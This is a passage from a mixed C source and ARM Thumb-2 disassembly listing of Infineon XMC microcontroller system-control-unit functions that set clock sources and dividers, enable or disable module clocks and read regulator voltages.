 80017b8:	4904      	ldr	r1, [pc, #16]	; (80017cc <XMC_SCU_CLOCK_SetUsbClockSource+0x24>)
 80017ba:	687b      	ldr	r3, [r7, #4]
 80017bc:	4313      	orrs	r3, r2
 80017be:	618b      	str	r3, [r1, #24]
                      ((uint32_t)source);
}
 80017c0:	bf00      	nop
 80017c2:	370c      	adds	r7, #12
 80017c4:	46bd      	mov	sp, r7
 80017c6:	f85d 7b04 	ldr.w	r7, [sp], #4
 80017ca:	4770      	bx	lr
 80017cc:	50004600 	.word	0x50004600

080017d0 <XMC_SCU_CLOCK_SetWdtClockSource>:

/* API to select fWDT */
void XMC_SCU_CLOCK_SetWdtClockSource(const XMC_SCU_CLOCK_WDTCLKSRC_t source)
{
 80017d0:	b480      	push	{r7}
 80017d2:	b083      	sub	sp, #12
 80017d4:	af00      	add	r7, sp, #0
 80017d6:	6078      	str	r0, [r7, #4]
  SCU_CLK->WDTCLKCR = (SCU_CLK->WDTCLKCR & ((uint32_t)~SCU_CLK_WDTCLKCR_WDTSEL_Msk)) |
 80017d8:	4b06      	ldr	r3, [pc, #24]	; (80017f4 <XMC_SCU_CLOCK_SetWdtClockSource+0x24>)
 80017da:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 80017dc:	f423 3240 	bic.w	r2, r3, #196608	; 0x30000
 80017e0:	4904      	ldr	r1, [pc, #16]	; (80017f4 <XMC_SCU_CLOCK_SetWdtClockSource+0x24>)
 80017e2:	687b      	ldr	r3, [r7, #4]
 80017e4:	4313      	orrs	r3, r2
 80017e6:	624b      	str	r3, [r1, #36]	; 0x24
                      ((uint32_t)source);
}
 80017e8:	bf00      	nop
 80017ea:	370c      	adds	r7, #12
 80017ec:	46bd      	mov	sp, r7
 80017ee:	f85d 7b04 	ldr.w	r7, [sp], #4
 80017f2:	4770      	bx	lr
 80017f4:	50004600 	.word	0x50004600

080017f8 <XMC_SCU_CLOCK_SetExternalOutputClockSource>:

/* API to select fEXT */
void XMC_SCU_CLOCK_SetExternalOutputClockSource(const XMC_SCU_CLOCK_EXTOUTCLKSRC_t source)
{
 80017f8:	b480      	push	{r7}
 80017fa:	b083      	sub	sp, #12
 80017fc:	af00      	add	r7, sp, #0
 80017fe:	4603      	mov	r3, r0
 8001800:	71fb      	strb	r3, [r7, #7]
  SCU_CLK->EXTCLKCR = (SCU_CLK->EXTCLKCR & ((uint32_t)~SCU_CLK_EXTCLKCR_ECKSEL_Msk)) |
 8001802:	4b07      	ldr	r3, [pc, #28]	; (8001820 <XMC_SCU_CLOCK_SetExternalOutputClockSource+0x28>)
 8001804:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 8001806:	f023 0203 	bic.w	r2, r3, #3
                      ((uint32_t)source);
 800180a:	79fb      	ldrb	r3, [r7, #7]
  SCU_CLK->EXTCLKCR = (SCU_CLK->EXTCLKCR & ((uint32_t)~SCU_CLK_EXTCLKCR_ECKSEL_Msk)) |
 800180c:	4904      	ldr	r1, [pc, #16]	; (8001820 <XMC_SCU_CLOCK_SetExternalOutputClockSource+0x28>)
 800180e:	4313      	orrs	r3, r2
 8001810:	628b      	str	r3, [r1, #40]	; 0x28
}
 8001812:	bf00      	nop
 8001814:	370c      	adds	r7, #12
 8001816:	46bd      	mov	sp, r7
 8001818:	f85d 7b04 	ldr.w	r7, [sp], #4
 800181c:	4770      	bx	lr
 800181e:	bf00      	nop
 8001820:	50004600 	.word	0x50004600

08001824 <XMC_SCU_CLOCK_SetSystemPllClockSource>:

/* API to select fPLL */
void XMC_SCU_CLOCK_SetSystemPllClockSource(const XMC_SCU_CLOCK_SYSPLLCLKSRC_t source)
{
 8001824:	b480      	push	{r7}
 8001826:	b083      	sub	sp, #12
 8001828:	af00      	add	r7, sp, #0
 800182a:	4603      	mov	r3, r0
 800182c:	80fb      	strh	r3, [r7, #6]
  /* Check input clock */
  if (source == XMC_SCU_CLOCK_SYSPLLCLKSRC_OSCHP) /* Select PLLClockSource */
 800182e:	88fb      	ldrh	r3, [r7, #6]
 8001830:	2b00      	cmp	r3, #0
 8001832:	d108      	bne.n	8001846 <XMC_SCU_CLOCK_SetSystemPllClockSource+0x22>
  {
    SCU_PLL->PLLCON2 &= (uint32_t)~(SCU_PLL_PLLCON2_PINSEL_Msk | SCU_PLL_PLLCON2_K1INSEL_Msk);
 8001834:	4b0b      	ldr	r3, [pc, #44]	; (8001864 <XMC_SCU_CLOCK_SetSystemPllClockSource+0x40>)
 8001836:	68db      	ldr	r3, [r3, #12]
 8001838:	4a0a      	ldr	r2, [pc, #40]	; (8001864 <XMC_SCU_CLOCK_SetSystemPllClockSource+0x40>)
 800183a:	f423 7380 	bic.w	r3, r3, #256	; 0x100
 800183e:	f023 0301 	bic.w	r3, r3, #1
 8001842:	60d3      	str	r3, [r2, #12]
  }
  else
  {
    SCU_PLL->PLLCON2 |= (uint32_t)(SCU_PLL_PLLCON2_PINSEL_Msk | SCU_PLL_PLLCON2_K1INSEL_Msk);
  }
}
 8001844:	e007      	b.n	8001856 <XMC_SCU_CLOCK_SetSystemPllClockSource+0x32>
    SCU_PLL->PLLCON2 |= (uint32_t)(SCU_PLL_PLLCON2_PINSEL_Msk | SCU_PLL_PLLCON2_K1INSEL_Msk);
 8001846:	4b07      	ldr	r3, [pc, #28]	; (8001864 <XMC_SCU_CLOCK_SetSystemPllClockSource+0x40>)
 8001848:	68db      	ldr	r3, [r3, #12]
 800184a:	4a06      	ldr	r2, [pc, #24]	; (8001864 <XMC_SCU_CLOCK_SetSystemPllClockSource+0x40>)
 800184c:	f443 7380 	orr.w	r3, r3, #256	; 0x100
 8001850:	f043 0301 	orr.w	r3, r3, #1
 8001854:	60d3      	str	r3, [r2, #12]
}
 8001856:	bf00      	nop
 8001858:	370c      	adds	r7, #12
 800185a:	46bd      	mov	sp, r7
 800185c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001860:	4770      	bx	lr
 8001862:	bf00      	nop
 8001864:	50004710 	.word	0x50004710

08001868 <XMC_SCU_HIB_SetRtcClockSource>:

/* API to select fRTC */
void XMC_SCU_HIB_SetRtcClockSource(const XMC_SCU_HIB_RTCCLKSRC_t source)
{ 
 8001868:	b480      	push	{r7}
 800186a:	b083      	sub	sp, #12
 800186c:	af00      	add	r7, sp, #0
 800186e:	4603      	mov	r3, r0
 8001870:	71fb      	strb	r3, [r7, #7]
  /* Wait until the update of HDCR register in hibernate domain is completed */
  while((SCU_GENERAL->MIRRSTS) & SCU_GENERAL_MIRRSTS_HDCR_Msk)
 8001872:	bf00      	nop
 8001874:	4b0a      	ldr	r3, [pc, #40]	; (80018a0 <XMC_SCU_HIB_SetRtcClockSource+0x38>)
 8001876:	f8d3 30c4 	ldr.w	r3, [r3, #196]	; 0xc4
 800187a:	f003 0308 	and.w	r3, r3, #8
 800187e:	2b00      	cmp	r3, #0
 8001880:	d1f8      	bne.n	8001874 <XMC_SCU_HIB_SetRtcClockSource+0xc>
  {
  }

  SCU_HIBERNATE->HDCR = (SCU_HIBERNATE->HDCR & ((uint32_t)~SCU_HIBERNATE_HDCR_RCS_Msk)) |
 8001882:	4b08      	ldr	r3, [pc, #32]	; (80018a4 <XMC_SCU_HIB_SetRtcClockSource+0x3c>)
 8001884:	68db      	ldr	r3, [r3, #12]
 8001886:	f023 0240 	bic.w	r2, r3, #64	; 0x40
                        ((uint32_t)source);
 800188a:	79fb      	ldrb	r3, [r7, #7]
  SCU_HIBERNATE->HDCR = (SCU_HIBERNATE->HDCR & ((uint32_t)~SCU_HIBERNATE_HDCR_RCS_Msk)) |
 800188c:	4905      	ldr	r1, [pc, #20]	; (80018a4 <XMC_SCU_HIB_SetRtcClockSource+0x3c>)
 800188e:	4313      	orrs	r3, r2
 8001890:	60cb      	str	r3, [r1, #12]
}
 8001892:	bf00      	nop
 8001894:	370c      	adds	r7, #12
 8001896:	46bd      	mov	sp, r7
 8001898:	f85d 7b04 	ldr.w	r7, [sp], #4
 800189c:	4770      	bx	lr
 800189e:	bf00      	nop
 80018a0:	50004000 	.word	0x50004000
 80018a4:	50004300 	.word	0x50004300

080018a8 <XMC_SCU_HIB_SetStandbyClockSource>:

/* API to select fSTDBY */
void XMC_SCU_HIB_SetStandbyClockSource(const XMC_SCU_HIB_STDBYCLKSRC_t source)
{
 80018a8:	b480      	push	{r7}
 80018aa:	b083      	sub	sp, #12
 80018ac:	af00      	add	r7, sp, #0
 80018ae:	4603      	mov	r3, r0
 80018b0:	71fb      	strb	r3, [r7, #7]
  while((SCU_GENERAL->MIRRSTS) & SCU_GENERAL_MIRRSTS_HDCR_Msk)
 80018b2:	bf00      	nop
 80018b4:	4b0a      	ldr	r3, [pc, #40]	; (80018e0 <XMC_SCU_HIB_SetStandbyClockSource+0x38>)
 80018b6:	f8d3 30c4 	ldr.w	r3, [r3, #196]	; 0xc4
 80018ba:	f003 0308 	and.w	r3, r3, #8
 80018be:	2b00      	cmp	r3, #0
 80018c0:	d1f8      	bne.n	80018b4 <XMC_SCU_HIB_SetStandbyClockSource+0xc>
  {
    /* check SCU_MIRRSTS to ensure that no transfer over serial interface is pending */
  }
  SCU_HIBERNATE->HDCR = (SCU_HIBERNATE->HDCR & ((uint32_t)~SCU_HIBERNATE_HDCR_STDBYSEL_Msk)) |
 80018c2:	4b08      	ldr	r3, [pc, #32]	; (80018e4 <XMC_SCU_HIB_SetStandbyClockSource+0x3c>)
 80018c4:	68db      	ldr	r3, [r3, #12]
 80018c6:	f023 0280 	bic.w	r2, r3, #128	; 0x80
                        ((uint32_t)source);
 80018ca:	79fb      	ldrb	r3, [r7, #7]
  SCU_HIBERNATE->HDCR = (SCU_HIBERNATE->HDCR & ((uint32_t)~SCU_HIBERNATE_HDCR_STDBYSEL_Msk)) |
 80018cc:	4905      	ldr	r1, [pc, #20]	; (80018e4 <XMC_SCU_HIB_SetStandbyClockSource+0x3c>)
 80018ce:	4313      	orrs	r3, r2
 80018d0:	60cb      	str	r3, [r1, #12]
}
 80018d2:	bf00      	nop
 80018d4:	370c      	adds	r7, #12
 80018d6:	46bd      	mov	sp, r7
 80018d8:	f85d 7b04 	ldr.w	r7, [sp], #4
 80018dc:	4770      	bx	lr
 80018de:	bf00      	nop
 80018e0:	50004000 	.word	0x50004000
 80018e4:	50004300 	.word	0x50004300

080018e8 <XMC_SCU_CLOCK_SetSystemClockDivider>:

/* API to program the divider placed between fsys and its parent */
void XMC_SCU_CLOCK_SetSystemClockDivider(const uint32_t divider)
{
 80018e8:	b480      	push	{r7}
 80018ea:	b083      	sub	sp, #12
 80018ec:	af00      	add	r7, sp, #0
 80018ee:	6078      	str	r0, [r7, #4]
  XMC_ASSERT("XMC_SCU_CLOCK_SetSystemClockDivider:Wrong clock divider value",
              (divider <= (SCU_CLK_SYSCLKCR_SYSDIV_Msk + 1UL)) );

  SCU_CLK->SYSCLKCR = (SCU_CLK->SYSCLKCR & ((uint32_t)~SCU_CLK_SYSCLKCR_SYSDIV_Msk)) |
 80018f0:	4b07      	ldr	r3, [pc, #28]	; (8001910 <XMC_SCU_CLOCK_SetSystemClockDivider+0x28>)
 80018f2:	68db      	ldr	r3, [r3, #12]
 80018f4:	f023 02ff 	bic.w	r2, r3, #255	; 0xff
                      ((uint32_t)(((uint32_t)(divider - 1UL)) << SCU_CLK_SYSCLKCR_SYSDIV_Pos));
 80018f8:	687b      	ldr	r3, [r7, #4]
 80018fa:	3b01      	subs	r3, #1
  SCU_CLK->SYSCLKCR = (SCU_CLK->SYSCLKCR & ((uint32_t)~SCU_CLK_SYSCLKCR_SYSDIV_Msk)) |
 80018fc:	4904      	ldr	r1, [pc, #16]	; (8001910 <XMC_SCU_CLOCK_SetSystemClockDivider+0x28>)
 80018fe:	4313      	orrs	r3, r2
 8001900:	60cb      	str	r3, [r1, #12]
}
 8001902:	bf00      	nop
 8001904:	370c      	adds	r7, #12
 8001906:	46bd      	mov	sp, r7
 8001908:	f85d 7b04 	ldr.w	r7, [sp], #4
 800190c:	4770      	bx	lr
 800190e:	bf00      	nop
 8001910:	50004600 	.word	0x50004600

08001914 <XMC_SCU_CLOCK_SetCcuClockDivider>:

/* API to program the divider placed between fccu and its parent */
void XMC_SCU_CLOCK_SetCcuClockDivider(const uint32_t divider)
{
 8001914:	b480      	push	{r7}
 8001916:	b083      	sub	sp, #12
 8001918:	af00      	add	r7, sp, #0
 800191a:	6078      	str	r0, [r7, #4]
  XMC_ASSERT("XMC_SCU_CLOCK_SetCapcomClockDivider:Wrong clock divider value", (divider <= 2UL) );

  SCU_CLK->CCUCLKCR = (SCU_CLK->CCUCLKCR & ((uint32_t)~SCU_CLK_CCUCLKCR_CCUDIV_Msk)) |
 800191c:	4b07      	ldr	r3, [pc, #28]	; (800193c <XMC_SCU_CLOCK_SetCcuClockDivider+0x28>)
 800191e:	6a1b      	ldr	r3, [r3, #32]
 8001920:	f023 0201 	bic.w	r2, r3, #1
                      (uint32_t)((uint32_t)(divider - 1UL) << SCU_CLK_CCUCLKCR_CCUDIV_Pos);
 8001924:	687b      	ldr	r3, [r7, #4]
 8001926:	3b01      	subs	r3, #1
  SCU_CLK->CCUCLKCR = (SCU_CLK->CCUCLKCR & ((uint32_t)~SCU_CLK_CCUCLKCR_CCUDIV_Msk)) |
 8001928:	4904      	ldr	r1, [pc, #16]	; (800193c <XMC_SCU_CLOCK_SetCcuClockDivider+0x28>)
 800192a:	4313      	orrs	r3, r2
 800192c:	620b      	str	r3, [r1, #32]
}
 800192e:	bf00      	nop
 8001930:	370c      	adds	r7, #12
 8001932:	46bd      	mov	sp, r7
 8001934:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001938:	4770      	bx	lr
 800193a:	bf00      	nop
 800193c:	50004600 	.word	0x50004600

08001940 <XMC_SCU_CLOCK_SetCpuClockDivider>:

/* API to program the divider placed between fcpu and its parent */
void XMC_SCU_CLOCK_SetCpuClockDivider(const uint32_t divider)
{
 8001940:	b480      	push	{r7}
 8001942:	b083      	sub	sp, #12
 8001944:	af00      	add	r7, sp, #0
 8001946:	6078      	str	r0, [r7, #4]
  XMC_ASSERT("XMC_SCU_CLOCK_SetCpuClockDivider:Wrong clock divider value", (divider <= 2UL) );

  SCU_CLK->CPUCLKCR = (SCU_CLK->CPUCLKCR & ((uint32_t)~SCU_CLK_CPUCLKCR_CPUDIV_Msk)) |
 8001948:	4b07      	ldr	r3, [pc, #28]	; (8001968 <XMC_SCU_CLOCK_SetCpuClockDivider+0x28>)
 800194a:	691b      	ldr	r3, [r3, #16]
 800194c:	f023 0201 	bic.w	r2, r3, #1
                      (uint32_t)((uint32_t)(divider - 1UL) << SCU_CLK_CPUCLKCR_CPUDIV_Pos);
 8001950:	687b      	ldr	r3, [r7, #4]
 8001952:	3b01      	subs	r3, #1
  SCU_CLK->CPUCLKCR = (SCU_CLK->CPUCLKCR & ((uint32_t)~SCU_CLK_CPUCLKCR_CPUDIV_Msk)) |
 8001954:	4904      	ldr	r1, [pc, #16]	; (8001968 <XMC_SCU_CLOCK_SetCpuClockDivider+0x28>)
 8001956:	4313      	orrs	r3, r2
 8001958:	610b      	str	r3, [r1, #16]
}
 800195a:	bf00      	nop
 800195c:	370c      	adds	r7, #12
 800195e:	46bd      	mov	sp, r7
 8001960:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001964:	4770      	bx	lr
 8001966:	bf00      	nop
 8001968:	50004600 	.word	0x50004600

0800196c <XMC_SCU_CLOCK_SetPeripheralClockDivider>:

/* API to program the divider placed between fperiph and its parent */
void XMC_SCU_CLOCK_SetPeripheralClockDivider(const uint32_t divider)
{
 800196c:	b480      	push	{r7}
 800196e:	b083      	sub	sp, #12
 8001970:	af00      	add	r7, sp, #0
 8001972:	6078      	str	r0, [r7, #4]
  XMC_ASSERT("XMC_SCU_CLOCK_SetPeripheralClockDivider:Wrong clock divider value", (divider <= 2UL) );

  SCU_CLK->PBCLKCR = (SCU_CLK->PBCLKCR & ((uint32_t)~SCU_CLK_PBCLKCR_PBDIV_Msk)) |
 8001974:	4b07      	ldr	r3, [pc, #28]	; (8001994 <XMC_SCU_CLOCK_SetPeripheralClockDivider+0x28>)
 8001976:	695b      	ldr	r3, [r3, #20]
 8001978:	f023 0201 	bic.w	r2, r3, #1
                     ((uint32_t)((uint32_t)(divider - 1UL) << SCU_CLK_PBCLKCR_PBDIV_Pos));
 800197c:	687b      	ldr	r3, [r7, #4]
 800197e:	3b01      	subs	r3, #1
  SCU_CLK->PBCLKCR = (SCU_CLK->PBCLKCR & ((uint32_t)~SCU_CLK_PBCLKCR_PBDIV_Msk)) |
 8001980:	4904      	ldr	r1, [pc, #16]	; (8001994 <XMC_SCU_CLOCK_SetPeripheralClockDivider+0x28>)
 8001982:	4313      	orrs	r3, r2
 8001984:	614b      	str	r3, [r1, #20]
}
 8001986:	bf00      	nop
 8001988:	370c      	adds	r7, #12
 800198a:	46bd      	mov	sp, r7
 800198c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001990:	4770      	bx	lr
 8001992:	bf00      	nop
 8001994:	50004600 	.word	0x50004600

08001998 <XMC_SCU_CLOCK_SetUsbClockDivider>:

/* API to program the divider placed between fsdmmc and its parent */
void XMC_SCU_CLOCK_SetUsbClockDivider(const uint32_t divider)
{
 8001998:	b480      	push	{r7}
 800199a:	b083      	sub	sp, #12
 800199c:	af00      	add	r7, sp, #0
 800199e:	6078      	str	r0, [r7, #4]
  XMC_ASSERT("XMC_SCU_CLOCK_SetSdmmcClockDivider:Wrong clock divider value",
              (divider <= (SCU_CLK_USBCLKCR_USBDIV_Msk + 1UL)) );

  SCU_CLK->USBCLKCR = (SCU_CLK->USBCLKCR & ((uint32_t)~SCU_CLK_USBCLKCR_USBDIV_Msk)) |
 80019a0:	4b07      	ldr	r3, [pc, #28]	; (80019c0 <XMC_SCU_CLOCK_SetUsbClockDivider+0x28>)
 80019a2:	699b      	ldr	r3, [r3, #24]
 80019a4:	f023 0207 	bic.w	r2, r3, #7
                      (uint32_t)((uint32_t)(divider - 1UL) << SCU_CLK_USBCLKCR_USBDIV_Pos); 
 80019a8:	687b      	ldr	r3, [r7, #4]
 80019aa:	3b01      	subs	r3, #1
  SCU_CLK->USBCLKCR = (SCU_CLK->USBCLKCR & ((uint32_t)~SCU_CLK_USBCLKCR_USBDIV_Msk)) |
 80019ac:	4904      	ldr	r1, [pc, #16]	; (80019c0 <XMC_SCU_CLOCK_SetUsbClockDivider+0x28>)
 80019ae:	4313      	orrs	r3, r2
 80019b0:	618b      	str	r3, [r1, #24]
}
 80019b2:	bf00      	nop
 80019b4:	370c      	adds	r7, #12
 80019b6:	46bd      	mov	sp, r7
 80019b8:	f85d 7b04 	ldr.w	r7, [sp], #4
 80019bc:	4770      	bx	lr
 80019be:	bf00      	nop
 80019c0:	50004600 	.word	0x50004600

080019c4 <XMC_SCU_CLOCK_SetEbuClockDivider>:

#if defined(EBU)
/* API to program the divider placed between febu and its parent */
void XMC_SCU_CLOCK_SetEbuClockDivider(const uint32_t divider)
{
 80019c4:	b480      	push	{r7}
 80019c6:	b083      	sub	sp, #12
 80019c8:	af00      	add	r7, sp, #0
 80019ca:	6078      	str	r0, [r7, #4]
  XMC_ASSERT("XMC_SCU_CLOCK_SetEbuClockDivider:Wrong clock divider value",
              (divider <= (SCU_CLK_EBUCLKCR_EBUDIV_Msk + 1UL) ) );

  SCU_CLK->EBUCLKCR = (SCU_CLK->EBUCLKCR & ((uint32_t)~SCU_CLK_EBUCLKCR_EBUDIV_Msk)) |
 80019cc:	4b07      	ldr	r3, [pc, #28]	; (80019ec <XMC_SCU_CLOCK_SetEbuClockDivider+0x28>)
 80019ce:	69db      	ldr	r3, [r3, #28]
 80019d0:	f023 023f 	bic.w	r2, r3, #63	; 0x3f
                      (uint32_t)(((uint32_t)(divider - 1UL)) << SCU_CLK_EBUCLKCR_EBUDIV_Pos);
 80019d4:	687b      	ldr	r3, [r7, #4]
 80019d6:	3b01      	subs	r3, #1
  SCU_CLK->EBUCLKCR = (SCU_CLK->EBUCLKCR & ((uint32_t)~SCU_CLK_EBUCLKCR_EBUDIV_Msk)) |
 80019d8:	4904      	ldr	r1, [pc, #16]	; (80019ec <XMC_SCU_CLOCK_SetEbuClockDivider+0x28>)
 80019da:	4313      	orrs	r3, r2
 80019dc:	61cb      	str	r3, [r1, #28]
}
 80019de:	bf00      	nop
 80019e0:	370c      	adds	r7, #12
 80019e2:	46bd      	mov	sp, r7
 80019e4:	f85d 7b04 	ldr.w	r7, [sp], #4
 80019e8:	4770      	bx	lr
 80019ea:	bf00      	nop
 80019ec:	50004600 	.word	0x50004600

080019f0 <XMC_SCU_CLOCK_SetWdtClockDivider>:
#endif

/* API to program the divider placed between fwdt and its parent */
void XMC_SCU_CLOCK_SetWdtClockDivider(const uint32_t divider)
{
 80019f0:	b480      	push	{r7}
 80019f2:	b083      	sub	sp, #12
 80019f4:	af00      	add	r7, sp, #0
 80019f6:	6078      	str	r0, [r7, #4]
  XMC_ASSERT("XMC_SCU_CLOCK_SetWdtClockDivider:Wrong clock divider value",
              (divider <= (SCU_CLK_WDTCLKCR_WDTDIV_Msk + 1UL) ) );

  SCU_CLK->WDTCLKCR = (SCU_CLK->WDTCLKCR & ((uint32_t)~SCU_CLK_WDTCLKCR_WDTDIV_Msk)) |
 80019f8:	4b07      	ldr	r3, [pc, #28]	; (8001a18 <XMC_SCU_CLOCK_SetWdtClockDivider+0x28>)
 80019fa:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 80019fc:	f023 02ff 	bic.w	r2, r3, #255	; 0xff
                      (uint32_t)(((uint32_t)(divider - 1UL)) << SCU_CLK_WDTCLKCR_WDTDIV_Pos);
 8001a00:	687b      	ldr	r3, [r7, #4]
 8001a02:	3b01      	subs	r3, #1
  SCU_CLK->WDTCLKCR = (SCU_CLK->WDTCLKCR & ((uint32_t)~SCU_CLK_WDTCLKCR_WDTDIV_Msk)) |
 8001a04:	4904      	ldr	r1, [pc, #16]	; (8001a18 <XMC_SCU_CLOCK_SetWdtClockDivider+0x28>)
 8001a06:	4313      	orrs	r3, r2
 8001a08:	624b      	str	r3, [r1, #36]	; 0x24
}
 8001a0a:	bf00      	nop
 8001a0c:	370c      	adds	r7, #12
 8001a0e:	46bd      	mov	sp, r7
 8001a10:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001a14:	4770      	bx	lr
 8001a16:	bf00      	nop
 8001a18:	50004600 	.word	0x50004600

08001a1c <XMC_SCU_CLOCK_SetExternalOutputClockDivider>:

/* API to program the divider placed between fext and its parent */
void XMC_SCU_CLOCK_SetExternalOutputClockDivider(const uint32_t divider)
{
 8001a1c:	b480      	push	{r7}
 8001a1e:	b083      	sub	sp, #12
 8001a20:	af00      	add	r7, sp, #0
 8001a22:	6078      	str	r0, [r7, #4]
  XMC_ASSERT("XMC_SCU_CLOCK_SetExternalOutputClockDivider:Wrong clock divider value",
              (divider <= (SCU_CLK_EXTCLKCR_ECKDIV_Msk + 1UL) ) );

  SCU_CLK->EXTCLKCR = (SCU_CLK->EXTCLKCR & ((uint32_t)~SCU_CLK_EXTCLKCR_ECKDIV_Msk)) |
 8001a24:	4b08      	ldr	r3, [pc, #32]	; (8001a48 <XMC_SCU_CLOCK_SetExternalOutputClockDivider+0x2c>)
 8001a26:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 8001a28:	f023 73ff 	bic.w	r3, r3, #33423360	; 0x1fe0000
 8001a2c:	f423 3380 	bic.w	r3, r3, #65536	; 0x10000
                      (uint32_t)(((uint32_t)(divider - 1UL)) << SCU_CLK_EXTCLKCR_ECKDIV_Pos);
 8001a30:	687a      	ldr	r2, [r7, #4]
 8001a32:	3a01      	subs	r2, #1
 8001a34:	0412      	lsls	r2, r2, #16
  SCU_CLK->EXTCLKCR = (SCU_CLK->EXTCLKCR & ((uint32_t)~SCU_CLK_EXTCLKCR_ECKDIV_Msk)) |
 8001a36:	4904      	ldr	r1, [pc, #16]	; (8001a48 <XMC_SCU_CLOCK_SetExternalOutputClockDivider+0x2c>)
 8001a38:	4313      	orrs	r3, r2
 8001a3a:	628b      	str	r3, [r1, #40]	; 0x28
}
 8001a3c:	bf00      	nop
 8001a3e:	370c      	adds	r7, #12
 8001a40:	46bd      	mov	sp, r7
 8001a42:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001a46:	4770      	bx	lr
 8001a48:	50004600 	.word	0x50004600

08001a4c <XMC_SCU_CLOCK_EnableClock>:
}
#endif

/* API to enable a given module clock */
void XMC_SCU_CLOCK_EnableClock(const XMC_SCU_CLOCK_t clock)
{
 8001a4c:	b480      	push	{r7}
 8001a4e:	b083      	sub	sp, #12
 8001a50:	af00      	add	r7, sp, #0
 8001a52:	4603      	mov	r3, r0
 8001a54:	71fb      	strb	r3, [r7, #7]
  SCU_CLK->CLKSET = ((uint32_t)clock);
 8001a56:	4a04      	ldr	r2, [pc, #16]	; (8001a68 <XMC_SCU_CLOCK_EnableClock+0x1c>)
 8001a58:	79fb      	ldrb	r3, [r7, #7]
 8001a5a:	6053      	str	r3, [r2, #4]
}
 8001a5c:	bf00      	nop
 8001a5e:	370c      	adds	r7, #12
 8001a60:	46bd      	mov	sp, r7
 8001a62:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001a66:	4770      	bx	lr
 8001a68:	50004600 	.word	0x50004600

08001a6c <XMC_SCU_CLOCK_DisableClock>:

/* API to disable a given module clock */
void XMC_SCU_CLOCK_DisableClock(const XMC_SCU_CLOCK_t clock)
{
 8001a6c:	b480      	push	{r7}
 8001a6e:	b083      	sub	sp, #12
 8001a70:	af00      	add	r7, sp, #0
 8001a72:	4603      	mov	r3, r0
 8001a74:	71fb      	strb	r3, [r7, #7]
  SCU_CLK->CLKCLR = ((uint32_t)clock);
 8001a76:	4a04      	ldr	r2, [pc, #16]	; (8001a88 <XMC_SCU_CLOCK_DisableClock+0x1c>)
 8001a78:	79fb      	ldrb	r3, [r7, #7]
 8001a7a:	6093      	str	r3, [r2, #8]
}
 8001a7c:	bf00      	nop
 8001a7e:	370c      	adds	r7, #12
 8001a80:	46bd      	mov	sp, r7
 8001a82:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001a86:	4770      	bx	lr
 8001a88:	50004600 	.word	0x50004600

08001a8c <XMC_SCU_CLOCK_IsClockEnabled>:

/* API to determine if module clock of the given peripheral is enabled */
bool XMC_SCU_CLOCK_IsClockEnabled(const XMC_SCU_CLOCK_t clock)
{
 8001a8c:	b480      	push	{r7}
 8001a8e:	b083      	sub	sp, #12
 8001a90:	af00      	add	r7, sp, #0
 8001a92:	4603      	mov	r3, r0
 8001a94:	71fb      	strb	r3, [r7, #7]
  return (bool)(SCU_CLK->CLKSTAT & ((uint32_t)clock));
 8001a96:	4b07      	ldr	r3, [pc, #28]	; (8001ab4 <XMC_SCU_CLOCK_IsClockEnabled+0x28>)
 8001a98:	681a      	ldr	r2, [r3, #0]
 8001a9a:	79fb      	ldrb	r3, [r7, #7]
 8001a9c:	4013      	ands	r3, r2
 8001a9e:	2b00      	cmp	r3, #0
 8001aa0:	bf14      	ite	ne
 8001aa2:	2301      	movne	r3, #1
 8001aa4:	2300      	moveq	r3, #0
 8001aa6:	b2db      	uxtb	r3, r3
}
 8001aa8:	4618      	mov	r0, r3
 8001aaa:	370c      	adds	r7, #12
 8001aac:	46bd      	mov	sp, r7
 8001aae:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001ab2:	4770      	bx	lr
 8001ab4:	50004600 	.word	0x50004600

08001ab8 <XMC_SCU_POWER_GetEVR13Voltage>:
  return ((*(uint32_t *)(&(SCU_CLK->CGATSTAT0) + (index * 3U)) & mask) != 0U);
}
#endif

float XMC_SCU_POWER_GetEVR13Voltage(void)
{
 8001ab8:	b480      	push	{r7}
 8001aba:	af00      	add	r7, sp, #0
  return (SCU_POWER->EVRVADCSTAT & SCU_POWER_EVRVADCSTAT_VADC13V_Msk) * XMC_SCU_POWER_LSB13V;
 8001abc:	4b08      	ldr	r3, [pc, #32]	; (8001ae0 <XMC_SCU_POWER_GetEVR13Voltage+0x28>)
 8001abe:	695b      	ldr	r3, [r3, #20]
 8001ac0:	b2db      	uxtb	r3, r3
 8001ac2:	ee07 3a90 	vmov	s15, r3
 8001ac6:	eef8 7a67 	vcvt.f32.u32	s15, s15
 8001aca:	ed9f 7a06 	vldr	s14, [pc, #24]	; 8001ae4 <XMC_SCU_POWER_GetEVR13Voltage+0x2c>
 8001ace:	ee67 7a87 	vmul.f32	s15, s15, s14
 8001ad2:	ee17 3a90 	vmov	r3, s15
}
 8001ad6:	4618      	mov	r0, r3
 8001ad8:	46bd      	mov	sp, r7
 8001ada:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001ade:	4770      	bx	lr
 8001ae0:	50004200 	.word	0x50004200
 8001ae4:	3bbe0ded 	.word	0x3bbe0ded

08001ae8 <XMC_SCU_POWER_GetEVR33Voltage>:

float XMC_SCU_POWER_GetEVR33Voltage(void)
{
 8001ae8:	b480      	push	{r7}
 8001aea:	af00      	add	r7, sp, #0
  return ((SCU_POWER->EVRVADCSTAT & SCU_POWER_EVRVADCSTAT_VADC33V_Msk) >> SCU_POWER_EVRVADCSTAT_VADC33V_Pos) * XMC_SCU_POWER_LSB33V;
 8001aec:	4b09      	ldr	r3, [pc, #36]	; (8001b14 <XMC_SCU_POWER_GetEVR33Voltage+0x2c>)
 8001aee:	695b      	ldr	r3, [r3, #20]
 8001af0:	0a1b      	lsrs	r3, r3, #8
 8001af2:	b2db      	uxtb	r3, r3
 8001af4:	ee07 3a90 	vmov	s15, r3
 8001af8:	eef8 7a67 	vcvt.f32.u32	s15, s15
